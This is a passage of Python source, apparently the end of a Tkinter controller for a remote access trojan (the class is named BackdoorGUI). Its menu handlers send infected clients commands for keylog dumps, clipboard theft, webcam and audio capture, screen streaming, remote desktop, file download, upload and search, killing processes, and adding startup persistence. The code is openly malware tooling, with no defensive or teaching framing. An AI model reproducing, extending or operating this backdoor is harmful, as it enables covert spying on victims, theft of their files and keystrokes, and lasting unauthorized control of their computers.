    def cmd_keylog_dump(self):  self._quick("keylog_dump")
    def cmd_clipboard(self):    self._quick("clipboard")
    def cmd_help(self):         self._quick("help")
    def cmd_persist_remove(self): self._quick("persistence_remove")

    def cmd_remote_desktop(self): self._quick("remote_desktop")

    def cmd_webcam_video(self):
        dur = simpledialog.askinteger(
            "Webcam Video", "Duration (seconds):",
            initialvalue=10, minvalue=1, maxvalue=300, parent=self.root)
        if dur:
            self._quick(f"webcam_video {dur}")

    def cmd_audio_record(self):
        dur = simpledialog.askinteger(
            "Audio Record", "Duration (seconds):",
            initialvalue=10, minvalue=1, maxvalue=300, parent=self.root)
        if dur:
            self._quick(f"audio_record {dur}")

    def cmd_screen_stream(self):
        n = simpledialog.askinteger(
            "Screen Stream", "Number of frames:",
            initialvalue=5, minvalue=1, maxvalue=60, parent=self.root)
        if n:
            self._quick(f"screen_stream {n}")

    def cmd_kill(self):
        pid = simpledialog.askinteger(
            "Kill Process", "Enter PID to kill:",
            minvalue=1, parent=self.root)
        if pid:
            self._quick(f"kill {pid}")

    def cmd_clipboard_set(self):
        text = simpledialog.askstring(
            "Set Clipboard", "Text to write:", parent=self.root)
        if text:
            self._quick(f"clipboard_set {text}")

    def cmd_download(self):
        path = simpledialog.askstring(
            "Download from Client", "Remote file path:", parent=self.root)
        if path:
            self._quick(f"download {path}")

    def cmd_upload(self):
        path = filedialog.askopenfilename(
            title="Select file to upload", parent=self.root)
        if path:
            self._quick(f"upload {path}")

    def cmd_filesearch(self):
        ext = simpledialog.askstring(
            "File Search", "Extension (e.g. .docx):",
            initialvalue=".docx", parent=self.root)
        if not ext:
            return
        directory = simpledialog.askstring(
            "File Search", "Directory (blank = home dir):", parent=self.root)
        cmd = f"filesearch {ext}"
        if directory:
            cmd += f" {directory}"
        self._quick(cmd)

    def cmd_persist_add(self):
        if messagebox.askyesno("Persistence",
                                "Add startup entry on client?",
                                parent=self.root):
            self._quick("persistence_add")

    # ─── Cleanup ─────────────────────────────────────────────────────────────

    def _on_close(self):
        if self.server_running:
            self.stop_server()
        self.root.destroy()


def main():
    root = tk.Tk()
    BackdoorGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
